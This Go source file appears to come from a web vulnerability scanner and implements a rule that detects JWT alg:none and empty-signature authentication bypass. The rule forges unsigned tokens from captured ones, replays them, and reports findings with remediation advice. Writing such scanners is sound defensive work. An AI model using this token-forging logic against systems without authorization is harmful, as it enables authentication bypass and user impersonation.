package active

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	anpuhttp "github.com/Marwanmorsy999/anpu/internal/http"
	"github.com/Marwanmorsy999/anpu/pkg/models"
)

// jwtRule detects JWT authentication bypass issues (none alg, weak verification).
//
// It operates only on vectors where OriginalValue looks like a JWT (3 dot-separated
// base64 segments). Probes:
//  1. `alg:none` unsigned token (header with alg:none, empty signature)
//  2. Empty signature stripping
//
// Safety: LowImpact — replaying modified tokens is read-only, no state change.
// All probes via anpuhttp with auth headers preserved.
type jwtRule struct{}

func (r *jwtRule) ID() models.ActiveRuleID    { return "jwt-weak-verification" }
func (r *jwtRule) Name() string               { return "JWT Weak Verification (alg:none)" }
func (r *jwtRule) Safety() models.SafetyLevel { return models.SafetyLowImpact }
func (r *jwtRule) RequestBudget() int         { return 6 }

func looksLikeJWT(s string) bool {
	parts := strings.Split(s, ".")
	if len(parts) != 3 {
		return false
	}
	for _, p := range parts {
		if len(p) < 8 {
			return false
		}
		// base64url characters only
		for _, c := range p {
			if (c < 'A' || c > 'Z') && (c < 'a' || c > 'z') && (c < '0' || c > '9') && c != '-' && c != '_' && c != '=' {
				return false
			}
		}
	}
	// Try to decode header JSON and check for alg
	if data, err := base64.RawURLEncoding.DecodeString(strings.TrimRight(parts[0], "=")); err == nil {
		var hdr map[string]interface{}
		if json.Unmarshal(data, &hdr) == nil {
			if _, ok := hdr["alg"]; ok {
				return true
			}
		}
	}
	return false
}

func buildNoneAlgJWT(orig string) string {
	parts := strings.Split(orig, ".")
	if len(parts) != 3 {
		return ""
	}
	// Decode header, replace alg with none
	hdrBytes, err := base64.RawURLEncoding.DecodeString(strings.TrimRight(parts[0], "="))
	if err != nil {
		hdrBytes = []byte(`{"alg":"HS256","typ":"JWT"}`)
	}
	var hdr map[string]interface{}
	if err := json.Unmarshal(hdrBytes, &hdr); err != nil {
		hdr = map[string]interface{}{"alg": "HS256", "typ": "JWT"}
	}
	hdr["alg"] = "none"
	newHdr, _ := json.Marshal(hdr)
	encHdr := base64.RawURLEncoding.EncodeToString(newHdr)
	// Keep payload as-is, empty signature
	return encHdr + "." + parts[1] + "."
}

func (r *jwtRule) Test(ctx context.Context, client *anpuhttp.Client, v models.InputVector) (models.ActiveRuleResult, error) {
	result := models.ActiveRuleResult{RuleID: r.ID(), Vector: v}
	if !looksLikeJWT(v.OriginalValue) {
		// Also check header vectors where Name is Authorization and value is Bearer <jwt>
		if v.Kind == models.VectorHeader && strings.EqualFold(v.Name, "Authorization") {
			val := strings.TrimPrefix(v.OriginalValue, "Bearer ")
			val = strings.TrimSpace(val)
			if !looksLikeJWT(val) {
				return result, nil
			}
		} else {
			return result, nil
		}
	}

	// Baseline: original JWT should get a baseline response (likely 200 or 401)
	var baselineStatus int
	switch v.Kind {
	case models.VectorHeader:
		resp, err := client.DoWithHeaders(ctx, "GET", v.URL, map[string]string{v.Name: v.OriginalValue})
		result.RequestsMade++
		if err != nil || resp == nil {
			return result, nil
		}
		baselineStatus = resp.StatusCode
	default:
		resp, err := client.Get(ctx, v.URL)
		result.RequestsMade++
		if err != nil || resp == nil {
			return result, nil
		}
		baselineStatus = resp.StatusCode
	}

	// Probe: alg:none token
	origJWT := v.OriginalValue
	if strings.HasPrefix(strings.ToLower(v.Name), "authorization") {
		origJWT = strings.TrimPrefix(v.OriginalValue, "Bearer ")
		origJWT = strings.TrimSpace(origJWT)
	}
	noneJWT := buildNoneAlgJWT(origJWT)
	if noneJWT == "" {
		return result, nil
	}
	var probeResp *anpuhttp.Response
	var err error
	switch v.Kind {
	case models.VectorHeader:
		hdrVal := "Bearer " + noneJWT
		probeResp, err = client.DoWithHeaders(ctx, "GET", v.URL, map[string]string{v.Name: hdrVal})
		result.RequestsMade++
	case models.VectorJSONBody:
		body, _ := buildJSONBody(v.Name, noneJWT)
		probeResp, err = client.PostJSON(ctx, v.URL, body, nil)
		result.RequestsMade++
	case models.VectorQueryParam:
		injected, e := InjectQueryParam(v.URL, v.Name, noneJWT)
		if e != nil {
			return result, nil
		}
		probeResp, err = client.Get(ctx, injected)
		result.RequestsMade++
	default:
		injected, e := buildInjectedURL(v, noneJWT)
		if e != nil {
			return result, nil
		}
		probeResp, err = client.Get(ctx, injected)
		result.RequestsMade++
	}
	if err != nil || probeResp == nil {
		return result, nil
	}
	// If baseline was 401 and probe becomes 200, that's a bypass signal.
	// Also if both 200 but probe body differs significantly and contains success markers.
	if baselineStatus == 401 && probeResp.StatusCode == 200 {
		result.Found = true
		result.Payload = noneJWT
		result.Evidence = fmt.Sprintf("JWT alg:none bypass: baseline %d → probe %d with alg:none token on %q (CT %q, len %d). The server accepted an unsigned token.", baselineStatus, probeResp.StatusCode, v.Name, probeResp.Header.Get("Content-Type"), len(probeResp.Body))
		return result, nil
	}
	// Also try empty signature stripping
	parts := strings.Split(noneJWT, ".")
	if len(parts) == 3 {
		emptySig := parts[0] + "." + parts[1] + "."
		if emptySig != noneJWT && result.RequestsMade < r.RequestBudget() {
			var resp2 *anpuhttp.Response
			switch v.Kind {
			case models.VectorHeader:
				resp2, _ = client.DoWithHeaders(ctx, "GET", v.URL, map[string]string{v.Name: "Bearer " + emptySig})
				result.RequestsMade++
			case models.VectorQueryParam:
				if inj, e := InjectQueryParam(v.URL, v.Name, emptySig); e == nil {
					resp2, _ = client.Get(ctx, inj)
					result.RequestsMade++
				}
			}
			if resp2 != nil && baselineStatus == 401 && resp2.StatusCode == 200 {
				result.Found = true
				result.Payload = emptySig
				result.Evidence = fmt.Sprintf("JWT empty-signature bypass: baseline 401 → %d with stripped signature on %q", resp2.StatusCode, v.Name)
				return result, nil
			}
		}
	}
	return result, nil
}

func (r *jwtRule) ToFinding(res models.ActiveRuleResult, target string) models.Finding {
	return models.Finding{
		ID:              fmt.Sprintf("active-jwt-%d", time.Now().UnixNano()),
		Title:           fmt.Sprintf("JWT weak verification (alg:none accepted) at %s", res.Vector.URL),
		Description:     fmt.Sprintf("Parameter %q carries a JWT that the server accepted with alg:none / empty signature (baseline %s). This indicates the server does not strictly verify the signature, allowing attackers to forge arbitrary tokens and impersonate users.", res.Vector.Name, res.Evidence),
		Severity:        models.SeverityHigh,
		Confidence:      models.ConfidenceMedium,
		Category:        models.CategoryVulnerability,
		CWE:             "CWE-345",
		OWASP:           "A02:2021 - Cryptographic Failures",
		Target:          target,
		URL:             res.Vector.URL,
		Parameter:       res.Vector.Name,
		Source:          models.SourceActive,
		DetectionMethod: "JWT alg:none / empty-signature replay via anpuhttp (stateful, header/body/WS aware)",
		Evidence:        models.Evidence{Observed: res.Evidence, Location: res.Vector.URL, RequestSummary: fmt.Sprintf("GET %s with JWT alg:none in %s", res.Vector.URL, res.Vector.Name)},
		Impact:          "Attackers can forge valid JWTs for any user (including admin) without knowing the secret, leading to full authentication bypass.",
		Remediation:     "Enforce strict alg allowlist (e.g., only RS256), never accept alg:none, validate signature with the correct key, and set short expirations.",
		References:      []string{"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Token"},
		FirstSeen:       time.Now(),
	}
}
